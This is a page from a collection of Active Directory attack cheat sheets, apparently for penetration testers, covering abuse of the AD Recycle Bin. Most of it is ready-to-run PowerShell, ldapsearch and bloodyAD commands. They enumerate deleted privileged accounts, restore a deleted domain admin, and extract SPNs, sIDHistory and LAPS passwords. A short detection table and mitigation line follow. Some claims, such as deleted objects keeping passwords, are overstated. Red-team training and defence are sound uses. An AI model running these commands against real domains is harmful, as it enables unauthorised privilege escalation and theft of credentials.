---
title: "Attack #78 — AD Recycle Bin Object Abuse"
description: "When the AD Recycle Bin feature is enabled (Server 2008 R2+), deleted AD objects are moved to the CN=Deleted Objects container and retained for a…"
category: active-directory
tags: ["active-directory", "privilege-escalation"]
tools: ["NetExec", "ldapsearch", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Ten/🔷 Attack #78 — AD Recycle Bin Object Abuse.md"
---
# 🔷 Attack #78 — AD Recycle Bin Object Abuse

***

## 📖 How It Works

When the **AD Recycle Bin** feature is enabled (Server 2008 R2+), deleted AD objects are moved to the `CN=Deleted Objects` container and retained for a configurable period (default 180 days). These deleted objects **retain all their attributes** — including passwords, SPNs, group memberships, and ACLs. An attacker can query the Recycle Bin to find recently deleted privileged accounts and either restore them or extract their sensitive attributes for exploitation.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **AD Recycle Bin enabled** | Domain/Forest functional level 2008 R2+ |
| **Domain user** | Basic read access to Deleted Objects container |
| **Or DA** | For object restoration |

***

## 💻 Full Commands

```powershell
# ── Check if Recycle Bin is enabled ───────────────────────────────────────────
Get-ADOptionalFeature -Filter {Name -like "Recycle*"}

# ── Query deleted objects ─────────────────────────────────────────────────────
Get-ADObject -SearchBase "CN=Deleted Objects,DC=corp,DC=local" \
  -IncludeDeletedObjects -Filter * -Properties *

# ── Find deleted privileged users ─────────────────────────────────────────────
Get-ADObject -SearchBase "CN=Deleted Objects,DC=corp,DC=local" \
  -IncludeDeletedObjects -Filter {ObjectClass -eq "user" -and adminCount -eq 1} \
  -Properties sAMAccountName,memberOf,adminCount,whenChanged

# ── Restore a deleted DA account ──────────────────────────────────────────────
Restore-ADObject -Identity "<deleted_object_DN>" -NewName "restored_admin"

# ── Extract attributes from deleted objects ──────────────────────────────────
Get-ADObject -SearchBase "CN=Deleted Objects,DC=corp,DC=local" \
  -IncludeDeletedObjects -Filter {sAMAccountName -eq "old_svc_account"} \
  -Properties servicePrincipalName,sIDHistory,ms-Mcs-AdmPwd
```

```bash
# ── ldapsearch — query Deleted Objects ────────────────────────────────────────
ldapsearch -x -H ldap://DC01.corp.local -D "low_user@corp.local" -w 'Password1' \
  -b "CN=Deleted Objects,DC=corp,DC=local" \
  -s sub "(objectClass=user)" -E '!1.2.840.113556.1.4.417=::MAA='

# ── NetExec / bloodyAD ────────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  get children "CN=Deleted Objects,DC=corp,DC=local" --type user
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Access to Deleted Objects container |
| **4741** | Security Log (DC) | Restored computer account |
| **4720** | Security Log (DC) | Restored user account |

***

## 🔗 Attack Chain Context

```
[AD Recycle Bin] ──→ Recover deleted privileged objects / extract sensitive attributes
         │
         ├──→ 🗑️ Deleted objects retain: passwords, SPNs, group memberships, LAPS
         ├──→ 🔗 Restore deleted DA account → instant privilege escalation
         ├──→ 📋 Default retention: 180 days
         └──→ 💀 Defeated by: monitor Deleted Objects access, purge sensitive objects properly
```

***

> ✅ **Attack #78 — AD Recycle Bin Object Abuse complete.**

***

> 🏁 **Category 10 — Misc / Modern Attacks is now COMPLETE (7/7 attacks).**

***

> 🏆 **THE FULL 78-ATTACK AD CHEAT SHEET LIBRARY IS NOW COMPLETE.**
